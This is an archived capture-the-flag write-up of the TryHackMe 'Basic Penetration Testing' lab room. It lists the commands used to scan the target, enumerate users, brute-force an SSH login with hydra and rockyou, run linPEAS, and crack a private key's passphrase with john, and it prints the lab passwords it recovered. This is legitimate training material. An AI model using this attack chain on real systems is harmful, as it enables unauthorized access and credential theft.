---
tags: [archive, tryhackme]
platform: TryHackMe
room: Basic Penetration Testing
status: archived
---

# Basic Penetration Testing

Room IP: `10.10.69.33`

## Scanning

PING: OK

```
nmap -sC -sV -oN nmap/initial 10.10.69.33
```

Ports:
- 22: ssh
- 80: web
- 139: Samba
- 445: Samba
- 8009: Apache JServ
- 8080: web

Dirbuster found `/development`: 2 files, `dev.txt` and `j.txt`.

```
enum4linux -a 10.10.69.33 | tee enum4linux.log
```
Found users: `kay` and `jan`.

```
hydra -l jan -P rockyou.txt ssh://10.10.69.33
```
Found password: `armando`.

```
ssh jan@10.10.69.33
```
`ls home`, `cd` to `kay`, `ls`. Could just read `pass.bak` directly, but the intended path is running linPEAS:

Local:
```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
scp ./linpeas.sh jan@10.10.69.33:/tmp
```
Remote:
```
cd /tmp
chmod +x linpeas.sh
./linpeas.sh | tee lin.log
```

Found an RSA key in `/home/kay/.ssh`. Copy it locally, `chmod 600`. It's password protected:
```
ssh2john kay_idrsa > john.cracked
john john.cracked --wordlist=./rockyou.txt
```
Found: `beeswax`.

```
ssh -i kay_idrsa kay@10.10.69.33
cat pass.bak
```
Result: `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
